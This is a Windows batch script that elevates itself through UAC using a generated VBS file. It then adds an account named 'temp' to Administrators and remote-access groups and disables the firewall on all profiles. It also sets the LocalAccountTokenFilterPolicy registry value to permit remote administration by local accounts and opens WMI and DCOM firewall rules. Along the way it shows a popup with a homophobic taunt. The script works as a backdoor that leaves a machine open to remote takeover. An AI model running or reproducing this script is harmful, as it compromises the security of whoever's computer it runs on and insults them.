@echo off
CLS

:init
setlocal DisableDelayedExpansion
set "batchPath=%~0"
for %%k in (%0) do set batchName=%%~nk
set "vbsGetPrivileges=%temp%\OEgetPriv_%batchName%.vbs"
setlocal EnableDelayedExpansion

:checkPrivileges
NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )

:getPrivileges
if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)

ECHO Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
ECHO args = "ELEV " >> "%vbsGetPrivileges%"
ECHO For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
ECHO args = args ^& strArg ^& " "  >> "%vbsGetPrivileges%"
ECHO Next >> "%vbsGetPrivileges%"
ECHO UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%vbsGetPrivileges%"
"%SystemRoot%\System32\WScript.exe" "%vbsGetPrivileges%" %*
exit /B

:gotPrivileges
setlocal & pushd .
cd /d %~dp0
if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)

::::::::::::::::::::::::::::
::START
::::::::::::::::::::::::::::
REM Run shell as admin (example) - put here code as you like
ECHO %batchName% Arguments: %1 %2 %3 %4 %5 %6 %7 %8 %9
rem cmd /k
net localgroup "Administrators" /add temp
net localgroup "Device Owners" /add temp
net localgroup "Remote Management Users" /add temp
net localgroup "Ssh Users" /add temp
net localgroup "Users" /add temp
netsh advfirewall set allprofiles state off
mshta "javascript:var sh=new ActiveXObject( 'WScript.Shell' ); sh.Popup( 'hehe, youre gay', 10, 'Youre gay', 64 );close()"
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
netsh advfirewall firewall add rule dir=in name="DCOM" program=%systemroot%\system32\svchost.exe service=rpcss action=allow protocol=TCP localport=135
netsh advfirewall firewall add rule dir=in name ="WMI" program=%systemroot%\system32\svchost.exe service=winmgmt action = allow protocol=TCP localport=any
netsh advfirewall firewall add rule dir=in name ="UnsecApp" program=%systemroot%\system32\wbem\unsecapp.exe action=allow
netsh advfirewall firewall add rule dir=out name ="WMI_OUT" program=%systemroot%\system32\svchost.exe service=winmgmt action=allow protocol=TCP localport=any